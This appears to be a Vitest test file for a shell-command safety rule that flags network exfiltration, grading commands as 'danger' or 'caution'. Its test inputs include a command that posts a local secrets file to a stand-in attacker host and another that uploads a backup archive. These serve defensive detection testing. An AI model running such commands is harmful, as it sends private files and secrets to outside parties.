import { describe, expect, it } from "vitest";
import { parseTokens } from "../../src/core/parser";
import { networkExfilRule } from "../../src/core/rules/network-exfil";
import { tokenize } from "../../src/core/tokenizer";

function firstCommand(source: string) {
  return parseTokens(tokenize(source)).parts[0].pipeline.stages[0];
}

describe("networkExfilRule", () => {
  it("flags piping local file contents to a remote POST, naming host and leak", () => {
    const findings = networkExfilRule(firstCommand("curl -d @secrets.txt http://evil.example.com"));
    expect(findings[0].severity).toBe("danger");
    expect(findings[0].reason).toMatch(/leav/i);
    expect(findings[0].reason).toContain("evil.example.com");
    expect(findings[0].reason).toContain("secrets.txt");
  });

  it("flags a plain outbound GET as caution, lower than the exfiltration case", () => {
    const findings = networkExfilRule(firstCommand("curl http://x"));
    expect(findings[0].severity).toBe("caution");
  });

  it("flags an upload-file transfer as danger", () => {
    const findings = networkExfilRule(firstCommand("curl -T backup.tar http://x"));
    expect(findings[0].severity).toBe("danger");
    expect(findings[0].reason).toContain("backup.tar");
  });

  it("does not flag a non-network command", () => {
    const findings = networkExfilRule(firstCommand("echo hello"));
    expect(findings).toHaveLength(0);
  });
});
